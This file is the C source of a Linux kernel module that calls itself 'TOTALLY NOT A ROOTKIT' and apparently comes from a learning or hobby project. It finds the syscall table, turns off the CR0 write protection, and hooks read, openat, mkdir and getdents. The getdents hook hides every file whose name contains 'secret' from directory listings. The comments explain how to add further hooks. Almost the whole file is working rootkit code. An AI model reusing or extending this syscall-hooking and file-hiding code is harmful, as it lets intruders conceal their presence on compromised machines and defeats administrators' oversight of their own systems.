#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>

#define CR0_WRITE_UNLOCK(x) \
	do { \
		unsigned long __cr0; \
		preempt_disable(); \
		__cr0 = read_cr0() & (~X86_CR0_WP); \
		BUG_ON(unlikely((__cr0 & X86_CR0_WP))); \
		write_cr0(__cr0); \
		x; \
		__cr0 = read_cr0() | X86_CR0_WP; \
		BUG_ON(unlikely(!(__cr0 && X86_CR0_WP))); \
		write_cr0(__cr0); \
		preempt_enable(); \
	} while(0)

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Khan");
MODULE_DESCRIPTION("TOTALLY NOT A ROOTKIT");

static unsigned long *sys_call_table;	//points to kernel's syscall table

//max numTargets
#define numTargets 4
#define SECRET_STRING "secret"

struct linux_dirent {
	long d_ino;
	off_t d_off;
	unsigned short d_reclen;
	char d_name[];
};

//MAKE CHANGES TO THE BELOW ARRAYS IN THE loadMod() function
static int syscall_names[numTargets]; //array defining syscall name (macro index) for each target
static void* original_syscallPtrs[numTargets]; //array to store ptrs to the original kernel syscall functions
static void* totallyReal_syscallPtrs[numTargets]; //array to store ptrs to our fake syscall functions
static bool toInject[numTargets] = {0};	//array to toggle which targets to intercept (default all 0 unless changed in loadMod)

asmlinkage long totallyReal_read(int fd, char __user *buf, size_t count) {
	pr_info("Intercepted read of fd=%d, %lu byes\n", fd, count);
	return ((typeof(sys_read)*)(original_syscallPtrs[0]))(fd, buf, count);
	//note how above the saved original ptr has to be casted back to typeof(sys_read) before being called.
}

asmlinkage long totallyReal_openat(int dirfd, const char *pathname, int flags, mode_t mode){
	pr_info("openAt called (mkdir?) path:%s\n", pathname);
	return ((typeof(sys_openat)*)(original_syscallPtrs[1]))(dirfd, pathname, flags, mode);
}


asmlinkage int totallyReal_mkdir(const char *pathname, mode_t mode){
	pr_info("fakeMkdir called with pathname:%s\n", pathname);
	return ((typeof(sys_mkdir)*)(original_syscallPtrs[2]))(pathname, mode);
}

/***  Modified getdents to hide files that contain secret string in filename ***/
asmlinkage long totallyReal_getdents (int fd, struct linux_dirent *dirp, int count) {
	/* similar to sys_read, prints to log very frequently */
	pr_info("fakeGetDents: %d %p %d\n", fd, dirp, count);

	int nread;
	struct linux_dirent *mod_dirp;

	// call original function to populate dirp
	nread = ((typeof(sys_getdents)*)(original_syscallPtrs[3]))(fd, dirp, count);
	if (nread == -1) {
		pr_info("fakeGetDents: error calling original function\n");
		return -1;
	} else {
		pr_info("fakeGetDents: successfully read %d bytes from filename: %s\n", nread, dirp->d_name);
	}

	// construct a new modified struct linux_dirent that hides secret files
	mod_dirp = kvmalloc(nread, GFP_KERNEL);
	if (mod_dirp == NULL) {
		pr_info("fakeGetDents: error allocating kernel space for modified dirp\n");
		kvfree(mod_dirp);
		return -1;
	} else {
		pr_info("fakeGetDents: successfully allocated %d bytes of space at address %p\n", nread, mod_dirp);
	}

	// copy contents of original dirp, which will be modified
	copy_from_user(mod_dirp, dirp, nread);
	pr_info("fakeGetDents: copied original dirp '%p' to new dirp '%p'\n", dirp, mod_dirp);

	// iterate through all files and hide any with secret string in filename
	long off = 0;
	struct linux_dirent *p_dirp, *prev;
	while (off < nread) {
		p_dirp = (void *)mod_dirp + off;
		//pr_info("fakeGetDents: reading off address %p from copied dirp\n", p_dirp);

		// if filename contains secret string, remove file from struct
		if (strstr(p_dirp->d_name, SECRET_STRING) != NULL) {
			if (p_dirp == mod_dirp) {
				pr_info("fakeGetDents: hiding super secret file '%s'\n", p_dirp->d_name);
				nread -= p_dirp->d_reclen;
				memmove(mod_dirp, (void *)mod_dirp + p_dirp->d_reclen, nread);
				continue;
			}
			prev->d_reclen += p_dirp->d_reclen;
		} else {
			pr_info("fakeGetDents: normal file '%s'\n", p_dirp->d_name);
			prev = p_dirp;
		}
		off += p_dirp->d_reclen;
		pr_info("fakeGetDents: incrementing pointer by %ld spaces; bytes left to read = %ld\n", off, nread - off);
	}

	// copy contents of modified dirp back to original dirp
	copy_to_user(dirp, mod_dirp, nread);
	pr_info("fakeGetDents: copied %d bytes of modified dirp '%p' back to original dirp '%p'\n", nread, mod_dirp, dirp);

	// free allocated kernel space
	kvfree(mod_dirp);
	return nread;
}

void injectSyscalls(void){
	int targetIndex;
	for(targetIndex = 0; targetIndex < numTargets; targetIndex++){
		if(toInject[targetIndex]){
			pr_info("Starting injection for target %d\n", targetIndex);

			//save original ptr
			original_syscallPtrs[targetIndex] = (void *) sys_call_table[syscall_names[targetIndex]];
			pr_info("original ptr stored as %p\n", original_syscallPtrs[targetIndex]);

			//inject fake ptr
			CR0_WRITE_UNLOCK({
				sys_call_table[syscall_names[targetIndex]] = (unsigned long)totallyReal_syscallPtrs[targetIndex];
			});
			pr_info("phony ptr injected as %p\n", (void *)sys_call_table[syscall_names[targetIndex]]);

			pr_info("Injection complete for target %d\n", targetIndex);
		}
		else {
			pr_info("skipping injection for target %d\n", targetIndex);
		}
	}
}

void restoreSyscalls(void){
	int targetIndex;
	for(targetIndex = 0; targetIndex < numTargets; targetIndex++){
		if(toInject[targetIndex]){
			pr_info("Restoring ptr for target %d\n", targetIndex);
			CR0_WRITE_UNLOCK({
				sys_call_table[syscall_names[targetIndex]] = (unsigned long)original_syscallPtrs[targetIndex];
			});
			pr_info("Ptr restored for target %d as %p\n", targetIndex, (void *)sys_call_table[syscall_names[targetIndex]]);
		}
		else {
			pr_info("Skipping restoration for target %d\n", targetIndex);
		}
	}
}

int __init loadMod(void){
	//get and store sys_call_table ptr
	sys_call_table = (void *)kallsyms_lookup_name("sys_call_table");
	if (sys_call_table == NULL){
		pr_info("sys_call_table not found using kallsyms\n");
		return -1;
	}

	pr_info("module loaded\n");
	pr_info("sys_call_table pointer is %p\n", sys_call_table);

	//FOR EACH NEW SYS CALL you must...
	//increment numTargets, thus obtaining a free index. Then using said index:
	syscall_names[0] = __NR_read;	//store the syscall name (is macro for index in sys_call_table)
	totallyReal_syscallPtrs[0] = (void *) &totallyReal_read;	//store the ptr to your fake function
	toInject[0] = 0;	//set whether or not you want to inject your fake function.

	syscall_names[1] = __NR_openat;
	totallyReal_syscallPtrs[1] = (void *) &totallyReal_openat;
	toInject[1] = 0;

	syscall_names[2] = __NR_mkdir;
	totallyReal_syscallPtrs[2] = (void *) &totallyReal_mkdir;
	toInject[2] = 1;

	syscall_names[3] = __NR_getdents;
	totallyReal_syscallPtrs[3] = (void *) &totallyReal_getdents;
	toInject[3] = 1;

	injectSyscalls();

	return 0;
}

void __exit unloadMod(void){
	pr_info("notarootkit unloading\n");

	restoreSyscalls();

	pr_info("notarootkit unloaded\n");
	return;
}

module_init(loadMod);
module_exit(unloadMod);

